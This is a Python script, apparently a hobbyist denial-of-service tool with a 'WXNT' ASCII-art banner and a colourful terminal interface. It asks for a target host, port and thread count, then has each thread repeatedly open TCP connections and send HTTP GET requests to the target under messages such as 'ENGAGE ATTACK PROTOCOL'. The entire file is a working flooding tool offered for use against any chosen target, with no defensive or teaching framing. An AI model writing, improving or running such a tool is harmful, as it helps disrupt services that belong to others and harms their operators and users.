import os
import sys
import time
import shutil
import threading
import itertools
import random
import socket

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class DummyColor:
        RESET_ALL = RED = LIGHTBLACK_EX = YELLOW = WHITE = ''
    Fore = Style = DummyColor()

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def edgy_loading_screen(message="LOADING", duration=3):
    glitch_chars = ['#', '%', '@', '&', '*', '+', '!', '?']
    cols, rows = shutil.get_terminal_size((80, 20))
    mid_row = rows // 2
    base_msg = f" {message} "
    spinner = itertools.cycle(glitch_chars)

    while duration > 0:
        glitch = next(spinner)
        display = f"{Fore.RED}{base_msg}{glitch*3}{Style.RESET_ALL}"
        padding = (cols - len(base_msg) - 3) // 2
        sys.stdout.write(f"\033[{mid_row};1H")
        sys.stdout.write(' ' * padding + display + '\n')
        sys.stdout.flush()
        time.sleep(0.1)
        duration -= 0.1
    sys.stdout.write(f"\033[{mid_row};1H" + ' ' * cols + '\n')

def print_progress_bar(current, total, prefix='', length=40):
    percent = current / total
    filled_length = int(length * percent)
    bar = f"{Fore.RED}" + '█' * filled_length + f"{Fore.LIGHTBLACK_EX}" + '─' * (length - filled_length) + f"{Style.RESET_ALL}"
    sys.stdout.write(f'\r{Fore.RED}{prefix} {Fore.WHITE}|{bar}{Fore.WHITE}| {current}/{total} packets sent{Style.RESET_ALL}')
    sys.stdout.flush()

def socket_attack(ip, port, thread_id, counter, counter_lock, total_packets):
    count = 0
    while count < 20:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\nHost: %b\r\n\r\n" % ip.encode())
            print(f"\n{Fore.YELLOW}[Thread-{thread_id}]{Fore.RED} >>{Style.RESET_ALL} Packet sent to {ip}:{port}")
        except Exception:
            print(f"\n{Fore.YELLOW}[Thread-{thread_id}]{Fore.RED} >>{Style.RESET_ALL} Connection failed to {ip}:{port}")
        count += 1
        with counter_lock:
            counter[0] += 1
            print_progress_bar(counter[0], total_packets, prefix='[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Progress')
        time.sleep(random.uniform(0.05, 0.2))

def attack_log(ip, port, threads):
    total_packets = threads * 20
    counter = [0]
    counter_lock = threading.Lock()

    sep = f"{Fore.RED}{'='*60}{Style.RESET_ALL}"
    print(f"\n{sep}")
    print(f"{Fore.RED}>>>{Fore.YELLOW} ENGAGE ATTACK PROTOCOL {Fore.RED}<<<{Style.RESET_ALL}")
    print(f"{sep}\n")
    print(f"{Fore.RED}[INFO]{Style.RESET_ALL} Target: {Fore.YELLOW}{ip}{Style.RESET_ALL}:{Fore.YELLOW}{port}{Style.RESET_ALL} | Threads: {Fore.YELLOW}{threads}{Style.RESET_ALL}\n")

    print_progress_bar(0, total_packets, prefix='[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] Progress')

    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=socket_attack, args=(ip, port, i + 1, counter, counter_lock, total_packets))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print()  # newline after progress bar
    print(f"\n{sep}")
    print(f"{Fore.RED}>>>{Fore.YELLOW} ATTACK COMPLETE {Fore.RED}<<<{Style.RESET_ALL}")
    print(f"{sep}\n")

def main():
    while True:
        clear_console()
        edgy_loading_screen("INITIALIZING", duration=3)

        clear_console()
        logo = f"""
{Fore.RED}

 /$$      /$$ /$$   /$$ /$$   /$$ /$$$$$$$$
| $$  /$ | $$| $$  / $$| $$$ | $$|__  $$__/
| $$ /$$$| $$|  $$/ $$/| $$$$| $$   | $$   
| $$/$$ $$ $$ \  $$$$/ | $$ $$ $$   | $$   
| $$$$_  $$$$  >$$  $$ | $$  $$$$   | $$   
| $$$/ \  $$$ /$$/\  $$| $$\  $$$   | $$   
| $$/   \  $$| $$  \ $$| $$ \  $$   | $$   
|__/     \__/|__/  |__/|__/  \__/   |__/   
{Style.RESET_ALL}
"""
        print(logo)

        ip = input(f"{Fore.RED}Target IP or Hostname:{Style.RESET_ALL} ")
        port = input(f"{Fore.RED}Port:{Style.RESET_ALL} ")
        threads = input(f"{Fore.RED}Threads:{Style.RESET_ALL} ")

        try:
            port = int(port)
            threads = int(threads)
            if threads < 1 or port < 1 or port > 65535:
                raise ValueError
        except ValueError:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Invalid port or thread count.")
            time.sleep(2)
            continue

        clear_console()
        edgy_loading_screen("LOCKING TARGET", duration=4)
        attack_log(ip, port, threads)

        input(f"{Fore.YELLOW}Attack complete. Press Enter to return to home...{Style.RESET_ALL}")
        clear_console()
        edgy_loading_screen("RETURNING TO HOME", duration=2)

if __name__ == "__main__":
    main()
